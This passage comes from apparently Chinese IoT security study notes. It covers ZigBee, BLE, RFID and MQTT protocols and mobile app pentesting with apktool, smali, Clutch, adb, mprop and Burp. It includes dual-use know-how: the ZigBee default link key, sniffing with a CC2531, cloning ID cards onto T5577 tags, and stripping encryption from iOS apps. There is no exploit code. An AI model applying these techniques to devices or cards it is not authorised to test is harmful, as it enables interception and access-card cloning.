<p>组网快，安全性高，最大速度250kbps，主要用来传输一些控制命令以及传感器采集的一些数据等等，低功耗技术，可拓展性强，最大可达到65535个节点</p>
<h4 id="1-2-节点类型"><a href="#1-2-节点类型" class="headerlink" title="1.2 节点类型"></a>1.2 节点类型</h4><p>ZigBee拓扑有三种功能节点：</p>
<ul>
<li>协调器（Coordinator）</li>
<li>路由器（Router）</li>
<li>终端设备（End Device）</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230321205931492.png" alt="image-20230321205931492"></p>
<h4 id="1-3-Zigbee架构"><a href="#1-3-Zigbee架构" class="headerlink" title="1.3 Zigbee架构"></a>1.3 Zigbee架构</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230321210917569.png" alt="image-20230321210917569"></p>
<p>相关博客推荐：</p>
<blockquote>
<p><a href="https://blog.csdn.net/aixuexidexiaowan/article/details/126782590">https://blog.csdn.net/aixuexidexiaowan/article/details/126782590</a></p>
<p><a href="https://blog.csdn.net/aixuexidexiaowan/article/details/127017017">https://blog.csdn.net/aixuexidexiaowan/article/details/127017017</a></p>
</blockquote>
<h4 id="1-4-设备组网流程"><a href="#1-4-设备组网流程" class="headerlink" title="1.4 设备组网流程"></a>1.4 设备组网流程</h4><p>组建一个完整的Zigbee网状网络包括两个步骤：网络初始化、节点加入网络。</p>
<p>其中节点加入网络又包括两个步骤：通过与协调器连接入网和通过已有父节点入网。</p>
<p>网络初始化：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230321212040804.png" alt="image-20230321212040804"></p>
<p>节点通过协调器加入网络：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230321212950854.png" alt="image-20230321212950854"></p>
<h3 id="2-Zigbee安全性"><a href="#2-Zigbee安全性" class="headerlink" title="2. Zigbee安全性"></a>2. Zigbee安全性</h3><p>在Zigbee标准中使用三种类型的128位对称密钥</p>
<ul>
<li>主密钥</li>
<li>网络密钥</li>
<li>链接密钥</li>
</ul>
<p>默认信任中心连接密钥 </p>
<p>0x5A 0x69 0x67 0x42 0x65 0x65 0x 41 0x6c 0x6c 0x69 0x61 0xe 0x63 0x65 0x 30 0x39</p>
<p>Zigbee采用AES-CCM*和帧计数器来保证数据的完整性、机密性、真实性。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230321213321605.png" alt="image-20230321213321605"></p>
<p>参考书《物联网安全漏洞挖掘实战》第五章部分内容</p>
<h3 id="3-Zigbee嗅探"><a href="#3-Zigbee嗅探" class="headerlink" title="3. Zigbee嗅探"></a>3. Zigbee嗅探</h3><p><strong>Zigbee数据抓包：</strong></p>
<p>工具：CC2531 usb Dongle</p>
<p>软件：ubiqua</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230321213506889.png" alt="image-20230321213506889"></p>
<p>参考书《物联网安全漏洞挖掘实战》第五章部分内容</p>
<h2 id="0x03-Bluetooth-BLE协议"><a href="#0x03-Bluetooth-BLE协议" class="headerlink" title="0x03 Bluetooth&#x2F;BLE协议"></a>0x03 Bluetooth&#x2F;BLE协议</h2><h3 id="1-蓝牙简介"><a href="#1-蓝牙简介" class="headerlink" title="1. 蓝牙简介"></a>1. 蓝牙简介</h3><p>一种无线个人局域网技术，用于在较小距离上交换数据，于1994年发明</p>
<p>2.4GHz至2.485GHz（ISM）频段</p>
<p>蓝牙网络称为微微网，互连微微网的形成散射网</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322093312506.png" alt="image-20230322093312506"></p>
<h3 id="2-蓝牙协议简介"><a href="#2-蓝牙协议简介" class="headerlink" title="2. 蓝牙协议简介"></a>2. 蓝牙协议简介</h3><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322093431979.png" alt="image-20230322093431979"></p>
<p>Radio：射频层，主要作用是信号调制</p>
<p>Baseband：基带层，负责各个蓝牙设备之间的连接，连接组成一个微微网</p>
<p>Link Manage：链路管理层，负责蓝牙设备间建立连接，Mgmt APP就是上层管理的一些APP</p>
<p>SDP：服务发现协议，可以查询到一些其他设备的详细信息</p>
<p>Mgmt APP：通过链路对蓝牙设备之间进行管理，比如蓝牙配对，连接管理之类</p>
<p>L2CAP层：将上层数据进行封装，打包传输给下层</p>
<p>Audio&#x2F;Audio APP：音乐等音频信号直接通过基带传递给APP</p>
<p>RF COMM：串口仿真层，将设备的蓝牙模拟为一个串口来传输一些无线数据，承载了一些其他协议和指令的集合</p>
<p>OBEX：传递一些文件数据，通讯录等</p>
<p>PPP&#x2F;BNEP：点对点&#x2F;蓝牙封装，将上层的TCP&#x2F;IP协议封装成蓝牙通过串口发送出去</p>
<p>AT modem commends：电话指令集和，提供语音通话功能。</p>
<h3 id="3-BLE简介"><a href="#3-BLE简介" class="headerlink" title="3. BLE简介"></a>3. BLE简介</h3><p>低功耗蓝牙BLE（Bluetooth Low Energy）是蓝牙技术联盟设计和销售的一种个人局域网技术，旨在用于医疗健康、安防娱乐等领域的新兴应用</p>
<p>可与传统蓝牙保持同等通信范围的同时显著降低功耗和成本</p>
<p>蓝牙4.0时被引入，也被称为Bluetooth Smart</p>
<h3 id="4-蓝牙-BLE的比较"><a href="#4-蓝牙-BLE的比较" class="headerlink" title="4. 蓝牙 BLE的比较"></a>4. 蓝牙 BLE的比较</h3><table>
<thead>
<tr>
<th align="left"></th>
<th align="left">传统蓝牙</th>
<th align="left">BLE</th>
</tr>
</thead>
<tbody><tr>
<td align="left">信道</td>
<td align="left">79个信道</td>
<td align="left">40个信道（37&#x2F;38&#x2F;39广播信道）</td>
</tr>
<tr>
<td align="left">发现&#x2F;连接</td>
<td align="left">查询</td>
<td align="left">广播</td>
</tr>
<tr>
<td align="left">连接延迟</td>
<td align="left">100ms</td>
<td align="left">6ms</td>
</tr>
<tr>
<td align="left">最大数据率</td>
<td align="left">1-3Mbps</td>
<td align="left">1Mbps</td>
</tr>
<tr>
<td align="left">工作距离</td>
<td align="left">10米</td>
<td align="left">最远100米</td>
</tr>
<tr>
<td align="left">最大输出功率</td>
<td align="left">100mW</td>
<td align="left">10mW</td>
</tr>
<tr>
<td align="left">主要应用</td>
<td align="left">无线播放、控制器</td>
<td align="left">智能家居、穿戴设备</td>
</tr>
</tbody></table>
<h3 id="5-BLE协议简介"><a href="#5-BLE协议简介" class="headerlink" title="5. BLE协议简介"></a>5. BLE协议简介</h3><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322095928812.png" alt="image-20230322095928812"></p>
<p>各层参考《物联网安全漏洞挖掘实战》5.3章节部分</p>
<h3 id="6-BLE连接过程"><a href="#6-BLE连接过程" class="headerlink" title="6. BLE连接过程"></a>6. BLE连接过程</h3><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322100925895.png" alt="image-20230322100925895"></p>
<p>传统蓝牙：跳频连接</p>
<p>BLE：广播连接</p>
<p>四种广播状态：</p>
<ul>
<li>ADV_IND：既允许被连接也允许被扫描</li>
<li>ADV_NONCONN_IND：既不允许被连接也不允许被扫描</li>
<li>ADV_SCAN_IND：只允许被扫描但不允许被连接</li>
<li>ADV_DIRECT_IND：只允许特定设备来连接</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322102759366.png" alt="image-20230322102759366"></p>
<h3 id="7-GATT简介"><a href="#7-GATT简介" class="headerlink" title="7. GATT简介"></a>7. GATT简介</h3><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322103114104.png" alt="image-20230322103114104"></p>
<h2 id="0x04-RFID协议讲解"><a href="#0x04-RFID协议讲解" class="headerlink" title="0x04 RFID协议讲解"></a>0x04 RFID协议讲解</h2><h3 id="1-RFID简介"><a href="#1-RFID简介" class="headerlink" title="1. RFID简介"></a>1. RFID简介</h3><h4 id="1-1-什么是RFID？"><a href="#1-1-什么是RFID？" class="headerlink" title="1.1 什么是RFID？"></a>1.1 什么是RFID？</h4><p>RFID是射频识别(Radio Frequency Identification) 的缩写，利用无线射频<br>方式进行非接触双向数据通信,通过对记录媒体(电子标签)进行读写，从而达到识别目标和数据交换的目的。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830224151830.png" alt="image-20220830224151830"></p>
<h4 id="1-2-RFID常见应用"><a href="#1-2-RFID常见应用" class="headerlink" title="1.2 RFID常见应用"></a>1.2 RFID常见应用</h4><p>由于RFID具有读写速度快，无需接触，设备简单等特点，在生活中被广泛使用，常见的应用有物流标签、公交门禁、购物就餐卡等</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830224333667.png" alt="image-20220830224333667"></p>
<h3 id="2-RFID组成"><a href="#2-RFID组成" class="headerlink" title="2. RFID组成"></a>2. RFID组成</h3><p>RFID由<strong>控制系统</strong>、<strong>阅读器</strong>和<strong>电子标签</strong>组成</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830224426312.png" alt="image-20220830224426312"></p>
<p><strong>阅读器</strong>(Reader) 通过天线与RFID电子标签进行无线通信，可以实现对<strong>标签识别码</strong>和<strong>内存数据</strong>的读出或写入操作。典型的阅读器包含有高频模块(发送器和接收器)、控制单元以及阅读器天线。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830224611195.png" alt="image-20220830224611195"></p>
<p><strong>电子标签</strong>(Tag)由耦合元件及芯片组成，每个标签具有唯一的电子编码。当电子标签进入由阅读器产生的无线电射频信号区域时获得能量，然后向阅读器发送储存的信息及数据。有时也被称作射频卡。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830224650335.png" alt="image-20220830224650335"></p>
<h3 id="3-RFID分类"><a href="#3-RFID分类" class="headerlink" title="3. RFID分类"></a>3. RFID分类</h3><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830224720380.png" alt="image-20220830224720380"></p>
<h4 id="3-1-常见标签"><a href="#3-1-常见标签" class="headerlink" title="3.1 常见标签"></a>3.1 常见标签</h4><p><strong>高频卡</strong></p>
<p>NXP Mifare S50 (M1 )高 频13.56MHz是最常见的射频卡。每张卡独一无二UID号，可存储、修改扇区数据(一卡通，门禁，电梯卡)。<br>NXP Mifare S70 Mi fare S70可容纳4KB数据，S50的卡类型(ATQA)是0004H<br>S70的卡类型(ATQA)是0002H。<br>NXP DESFire&#x2F;JCOP基于微处理器的芯片卡广 泛应用如银行与金融，移动通信，公共交通，访客访问和网络接入等领域。支持接触式、非接触式读写，JCOP版本内含操作系统，并提供40-80K字节EEPROM存储器。</p>
<p><strong>低频卡</strong></p>
<p>EM4100</p>
<ul>
<li>工作频率125kHz卡内只存储卡号且无法修改</li>
<li>成本低广泛用于门禁、身份识别，安防医疗系统</li>
</ul>
<p>HID ProxCard II </p>
<ul>
<li>与EM4 系列卡片类似只存储卡号名片大小厚度较厚</li>
</ul>
<p>T5577卡</p>
<ul>
<li>可写入数据可设置密码的低频卡</li>
<li>可用于复制ID和HID卡</li>
<li>共有8个块，共可存储256b数据</li>
</ul>
<h4 id="3-2-示例"><a href="#3-2-示例" class="headerlink" title="3.2 示例"></a>3.2 示例</h4><p><strong>Mifare 1</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830225203258.png" alt="image-20220830225203258"></p>
<p>Mifare 1变种</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830225307361.png" alt="image-20220830225307361"></p>
<p><strong>EM4100</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830225349170.png" alt="image-20220830225349170"></p>
<p><strong>T5577</strong></p>
<p>T5577结构</p>
<ul>
<li>共有8个块，每个块存32b数据</li>
<li>第0块表示调制方式和卡片类型</li>
<li>第7块表示加密的密码，无密则表示普通数据</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220830225536472.png" alt="image-20220830225536472"></p>
<h2 id="0x05-MQTT等协议讲解"><a href="#0x05-MQTT等协议讲解" class="headerlink" title="0x05 MQTT等协议讲解"></a>0x05 MQTT等协议讲解</h2><h3 id="MQTT"><a href="#MQTT" class="headerlink" title="MQTT"></a>MQTT</h3><p>MQTT (Message Queuing Telemetry Transport,消息队列遥测传输协议)，是一种基于发布&#x2F;订阅(publish&#x2F;subscribe) 模式的”轻量级”通讯协议，该协议构建于TCP&#x2F;IP协议上，由IBM在1999年发布。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220910222715883.png" alt="image-20220910222715883"></p>
<h3 id="MQTT实现过程"><a href="#MQTT实现过程" class="headerlink" title="MQTT实现过程"></a>MQTT实现过程</h3><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220910222848417.png" alt="image-20220910222848417"></p>
<p>发布者和订阅者，两者的角色并不是绝对的，可以转换或者同时存在。</p>
<h3 id="设计原则与特性"><a href="#设计原则与特性" class="headerlink" title="设计原则与特性"></a>设计原则与特性</h3><ul>
<li>精简，把传输量降到最低</li>
<li>发布&#x2F;订阅（Pub&#x2F;Sub）模式，提供一对多的消息发布，解除应用程序耦合</li>
<li>允许用户动态创建主题</li>
<li>把低带宽、高延迟、不稳定的网络因素考虑在内</li>
<li>提供服务质量管理</li>
<li>有三种消息发布质量（Qos）<ul>
<li>至多一次</li>
<li>至少一次</li>
<li>只有一次</li>
</ul>
</li>
<li>使用遗嘱（last will）特性通知有关各方客户端异常中断的机制</li>
</ul>
<h3 id="MQTT服务本地测试"><a href="#MQTT服务本地测试" class="headerlink" title="MQTT服务本地测试"></a>MQTT服务本地测试</h3><p>使用工具：mosquito</p>
<p>服务端开启代理服务<code>mosquito [-p port]</code><br>客户端订阅主题<code>mosquito_sub -t topic [-p port -h host]</code><br>客户端发布消息<code>mosquito_pub -t topic -m message [-p port -h host]</code></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220910223326412.png" alt="image-20220910223326412"></p>
<h3 id="消息报文格式"><a href="#消息报文格式" class="headerlink" title="消息报文格式"></a>消息报文格式</h3><p>MQTT协议是应用层协议，需要借助TCP&#x2F;IP协议进行传输，类似HTTP协议。MQTT协议也有自己的格式：</p>
<center>固定头部＋可变头部＋消息载体


<p>①固定头部：通过固定头部区分多种消息类型，如连接，发布，订阅等</p>
<p>②可变头部：有些协议类型中存在，在有些协议中不存在</p>
<p>③消息载体：消息的主要内容</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220910223713813.png" alt="image-20220910223713813"></p>
<p><strong>固定头部格式</strong></p>
<p>固定头部格式包含两部分内容，<strong>首字节</strong>+<strong>剩余消息报文长度</strong></p>
<p><strong>首字节</strong>：首字节用于表示MQTT消息的报文类型以及某些类型的控制标记。</p>
<p>高四位（bit7~bit4）表示协议类型</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220910223945130.png" alt="image-20220910223945130"></p>
<p>低四位（bit3~bit0）用于表示某些报文类型的控制字段</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220910224107433.png" alt="image-20220910224107433"></p>
<p>仅当报文类型为PUBLISH时，该字段才有意义。其中Qos不能为3，否则接收段会认为是一条非法的消息。</p>
<p><strong>Connect可变头部</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220910224544640.png" alt="image-20220910224544640"></p>
<p><strong>MQTT报文格式文档：</strong><a href="http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html">http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html</a></p>
]]></content>
      <categories>
        <category>IoT安全入门</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT安全入门07</title>
    <url>/2023/03/28/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IoT%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A807/</url>
    <content><![CDATA[<h1 id="第七章-物联网渗透测试之移动应用"><a href="#第七章-物联网渗透测试之移动应用" class="headerlink" title="第七章 物联网渗透测试之移动应用"></a>第七章 物联网渗透测试之移动应用</h1><h2 id="0x01-安卓应用程序分析"><a href="#0x01-安卓应用程序分析" class="headerlink" title="0x01 安卓应用程序分析"></a>0x01 安卓应用程序分析</h2><h3 id="1-Android-apk安装包分析"><a href="#1-Android-apk安装包分析" class="headerlink" title="1. Android apk安装包分析"></a>1. Android apk安装包分析</h3><h4 id="1-1-Android"><a href="#1-1-Android" class="headerlink" title="1.1 Android"></a>1.1 Android</h4><p>Android是一个开源的，基于Linux的移动设备操作系统，如智能手机和平板电脑。它是由谷歌及其他一些公司带领的开放手机联盟发行和开发的。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230320123739350.png" alt="image-20230320123739350"></p>
<span id="more"></span>

<h4 id="1-2-Android应用组件"><a href="#1-2-Android应用组件" class="headerlink" title="1.2 Android应用组件"></a>1.2 Android应用组件</h4><p>Android开发四大组件分别是：</p>
<ul>
<li>活动（Activity）最基础</li>
<li>服务（Service）后台</li>
<li>广播接收器（BroadcastReceiver）</li>
<li>内容提供者（Content Provider）不同APP之间数据传递共享</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230320123939180.png" alt="image-20230320123939180"></p>
<h4 id="1-3-Android安装包"><a href="#1-3-Android安装包" class="headerlink" title="1.3 Android安装包"></a>1.3 Android安装包</h4><p>一个Android应用程序的代码想要在Android设备上运行，必须先进行编译，然后被打包成为一个可被系统所能识别的文件</p>
<p>Android设备可以识别的安装包是.APK(Android application package)格式，可用于分发和安装移动应用及中间件。</p>
<p>一个APK安装包内包含：</p>
<ul>
<li><p>被编译的源代码文件</p>
</li>
<li><p>文件资源</p>
</li>
<li><p>原生资源文件</p>
</li>
<li><p>证书（签名）</p>
</li>
<li><p>清单文件</p>
</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230320125146214.png" alt="image-20230320125146214"></p>
<h3 id="2-静态反编译工具的使用"><a href="#2-静态反编译工具的使用" class="headerlink" title="2. 静态反编译工具的使用"></a>2. 静态反编译工具的使用</h3><h4 id="2-1-工具介绍"><a href="#2-1-工具介绍" class="headerlink" title="2.1 工具介绍"></a>2.1 工具介绍</h4><p>高级语言源程序经过编译变成可执行文件，反编译就是逆过程</p>
<ul>
<li><p>Apktool</p>
<p>反编译资源和dex文件，并可以将反编译后的项目重新打包成apk</p>
<p>github开源下载</p>
</li>
<li><p>apksigner</p>
<p>apk签名&#x2F;验证 工具</p>
</li>
<li><p>dex2jar</p>
<p>将dex转化为.jar</p>
<p>github开源下载</p>
</li>
<li><p>jd-gui</p>
<p>查看.jar源码</p>
</li>
<li><p>jadx</p>
<p>一款功能强大的快速安卓反编译工具</p>
</li>
</ul>
<h3 id="3-smali语法简介"><a href="#3-smali语法简介" class="headerlink" title="3. smali语法简介"></a>3. smali语法简介</h3><p>Dalvik VM是在Android系统上运行Android程序的虚拟机，其指令集是基于寄存器架构的，执行特有的文件格式（dex字节码）来完成对象生命周期管理、堆栈管理、线程管理、安全异常管理、垃圾回收等重要功能。</p>
<p>Smali是用于Dalivk的反汇编程序的实现。Smali支持注解，调试信息，行数信息等基本Java的基本特征，很接近Java编译在JVM上的中间语言。</p>
<p>从Dalvik VM和JVM的编译过程分析，他们的编译过程如下：</p>
<p>JVM：.java -&gt; .class -&gt; .jar</p>
<p>Dalvik VM：.java -&gt; .class -&gt;  .dex</p>
<h4 id="3-1-smali的数据类型"><a href="#3-1-smali的数据类型" class="headerlink" title="3.1 smali的数据类型"></a>3.1 smali的数据类型</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230320182754339.png" alt="image-20230320182754339"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230320183606467.png" alt="image-20230320183606467"></p>
<h4 id="3-2-smali函数定义"><a href="#3-2-smali函数定义" class="headerlink" title="3.2 smali函数定义"></a>3.2 smali函数定义</h4><p>函数的定义一般为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数名（参数类型1 参数类型2...）返回值类型</span><br></pre></td></tr></table></figure>

<p>基本数据类型的参数与参数之间没有任何分隔符，对象数据类型使用<code>;</code>结束</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230320184338440.png" alt="image-20230320184338440"></p>
<h4 id="3-3-smali的寄存器"><a href="#3-3-smali的寄存器" class="headerlink" title="3.3 smali的寄存器"></a>3.3 smali的寄存器</h4><table>
<thead>
<tr>
<th></th>
<th></th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>v0</td>
<td></td>
<td>第一个本地寄存器</td>
</tr>
<tr>
<td>v1</td>
<td></td>
<td>第二个本地寄存器</td>
</tr>
<tr>
<td>v2</td>
<td>p0</td>
<td>第一个参数寄存器</td>
</tr>
<tr>
<td>v3</td>
<td>p1</td>
<td>第二个参数寄存器</td>
</tr>
</tbody></table>
<h4 id="3-4-smali代码举例"><a href="#3-4-smali代码举例" class="headerlink" title="3.4 smali代码举例"></a>3.4 smali代码举例</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230320184824932.png" alt="image-20230320184824932"></p>
<h2 id="0x02-ios应用程序分析"><a href="#0x02-ios应用程序分析" class="headerlink" title="0x02 ios应用程序分析"></a>0x02 ios应用程序分析</h2><h3 id="IPA脱壳"><a href="#IPA脱壳" class="headerlink" title="IPA脱壳"></a>IPA脱壳</h3><p>从APPStore商店下载安装的APP默认都被苹果加了一层壳，加了壳后我们就无法正常查看程序的运行逻辑了</p>
<p>需要工具：</p>
<ul>
<li>越狱的IOS设备</li>
<li>Clutch：<a href="https://github.com/KJCracks/Clutch/releases">https://github.com/KJCracks/Clutch/releases</a></li>
</ul>
<p>通过ssh远程连接</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230320185521354.png" alt="image-20230320185521354"></p>
<p>显示当前应用：<code>Clutch -l</code></p>
<p>选择指定应用进行脱壳：<code>Clutch -d packageName</code></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230320185635950.png" alt="image-20230320185635950"></p>
<p>将脱壳后的安装包导出</p>
<h3 id="MobSF"><a href="#MobSF" class="headerlink" title="MobSF"></a>MobSF</h3><p>MobSF是Mobile Security Framework的缩写，是一个移动端应用安全问题检出的框架和工具，支持Linux&#x2F;Windows&#x2F;Mac，能够执行动态和静态的恶意软件的分析和检测，支持Android和ios移动应用。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230320190042925.png" alt="image-20230320190042925"></p>
<p>GitHub仓库地址：<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF.git">https://github.com/MobSF/Mobile-Security-Framework-MobSF.git</a></p>
<h2 id="0x03-Android动态调试分析工具使用"><a href="#0x03-Android动态调试分析工具使用" class="headerlink" title="0x03 Android动态调试分析工具使用"></a>0x03 Android动态调试分析工具使用</h2><h3 id="1-adb调试命令"><a href="#1-adb调试命令" class="headerlink" title="1. adb调试命令"></a>1. adb调试命令</h3><h4 id="1-1-ADB"><a href="#1-1-ADB" class="headerlink" title="1.1 ADB"></a>1.1 ADB</h4><p>Android调试桥（adb）是一种功能多样的命令行工具，可以让你与设备进行通信。adb命令可用于执行各种设备操作（例如安装和调试应用），并针对Unix shell（可用来在设备上运行各种命令）的访问权限。</p>
<p>它是一种客户端-服务器程序，包含以下三个组件：</p>
<ul>
<li>客户端：用于发送命令。客户端在开发计算机上运行，你可以通过发出adb命令从命令行终端调用客户端。</li>
<li>守护程序（adbd）：用于在设备上运行命令。守护程序在每个设备上作为后台进程运行。</li>
<li>服务器：用于管理客户端与守护程序之间的通信。服务器在开发机器上作为后台进程运行。</li>
</ul>
<p><strong>在设备上启用 adb 调试：</strong></p>
<p>要在通过 USB 连接的设备上使用 adb，必须在设备的系统设置中启用 USB 调试（位于开发者选项下）。</p>
<p>在搭载Android4.2及更高版本的设备上，”开发者选项” 屏幕默认情况下处于隐藏状态。如需将其显示出来，请依次转到 设置 &gt; 关于手机，然后点按版本号7次，返回上一屏幕，在底部可以找到开发者选项。具体请依照不同设备实际为准。</p>
<h4 id="1-2-ADB常用命令"><a href="#1-2-ADB常用命令" class="headerlink" title="1.2 ADB常用命令"></a>1.2 ADB常用命令</h4><p>查看设备列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>

<p>远程连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb connect ip:port</span><br></pre></td></tr></table></figure>

<p>进入交互式shell模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell</span><br></pre></td></tr></table></figure>

<p>查看进程pid号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell &quot;ps | grep 包名&quot;</span><br></pre></td></tr></table></figure>

<p>查看logcat日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb logcat</span><br></pre></td></tr></table></figure>

<p>移动文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb push/push</span><br></pre></td></tr></table></figure>

<p>安装&#x2F;卸载 应用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb install/uninstall</span><br></pre></td></tr></table></figure>

<p>SHELL查看当前活动的Activity</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dumpsys activity top | grep ACTIVITY</span><br></pre></td></tr></table></figure>

<p>SHELL启动指定Activity&#x2F;Service</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">am start/startservice -n 包名/完整类名[-d data]</span><br></pre></td></tr></table></figure>

<p>端口转发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb forward tcp:1234 tcp:1234</span><br></pre></td></tr></table></figure>

<p>查看系统配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell getprop</span><br></pre></td></tr></table></figure>



<h3 id="2-调试环境搭建"><a href="#2-调试环境搭建" class="headerlink" title="2. 调试环境搭建"></a>2. 调试环境搭建</h3><p>设置为允许调试</p>
<ol>
<li>修改Manifest.xml文件的Application属性</li>
<li>将设备属性ro.debuggable设置为1</li>
</ol>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230320204911577.png" alt="image-20230320204911577"></p>
<p><strong>app配置修改为允许调试：</strong></p>
<p>反编译安装包AndroidManifest.xml，在application内修改或添加 android:debuggable&#x3D;”true”，并重打包签名。</p>
<p><strong>系统修改为允许所有应用调试：</strong></p>
<p>使用mprop工具来修改</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb push mprop /data/local/tmp/</span><br><span class="line">adb shell su</span><br><span class="line">chmod 755 /data/local/tmp/mprop</span><br><span class="line">data/local/tmp/mprop</span><br><span class="line">setprop ro.debuggable 1</span><br><span class="line">/data/local/tmp/mprop -r</span><br></pre></td></tr></table></figure>



<h3 id="3-Smalidea动态调试"><a href="#3-Smalidea动态调试" class="headerlink" title="3. Smalidea动态调试"></a>3. Smalidea动态调试</h3><h4 id="3-1-使用smalidea插件"><a href="#3-1-使用smalidea插件" class="headerlink" title="3.1 使用smalidea插件"></a>3.1 使用smalidea插件</h4><p>smalidea是一个Intellij IDEA&#x2F;Android Studio smali语法插件，可实现动态调试smali代码。支持14.1或以上版本的IDEA。</p>
<p>下载地址：<a href="https://github.com/JesusFreke/smali/wiki/smalidea">https://github.com/JesusFreke/smali/wiki/smalidea</a></p>
<h2 id="0x04-安卓-ios应用-网络接口分析"><a href="#0x04-安卓-ios应用-网络接口分析" class="headerlink" title="0x04 安卓&#x2F;ios应用 网络接口分析"></a>0x04 安卓&#x2F;ios应用 网络接口分析</h2><h3 id="1-Https"><a href="#1-Https" class="headerlink" title="1. Https"></a>1. Https</h3><h4 id="1-1-https协议流程"><a href="#1-1-https协议流程" class="headerlink" title="1.1 https协议流程"></a>1.1 https协议流程</h4><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230320210545112.png" alt="image-20230320210545112" style="zoom: 67%;" />



<h4 id="1-2-中间人攻击"><a href="#1-2-中间人攻击" class="headerlink" title="1.2 中间人攻击"></a>1.2 中间人攻击</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230320211012277.png" alt="image-20230320211012277"></p>
<h3 id="2-设备证书安装"><a href="#2-设备证书安装" class="headerlink" title="2. 设备证书安装"></a>2. 设备证书安装</h3><p>安装Burp suit的证书</p>
<h3 id="3-Burp-suit使用"><a href="#3-Burp-suit使用" class="headerlink" title="3. Burp suit使用"></a>3. Burp suit使用</h3><p>可参考gitbook：<a href="https://t0data.gitbooks.io/burpsuite/content/?q=">https://t0data.gitbooks.io/burpsuite/content/?q=</a></p>
]]></content>
      <categories>
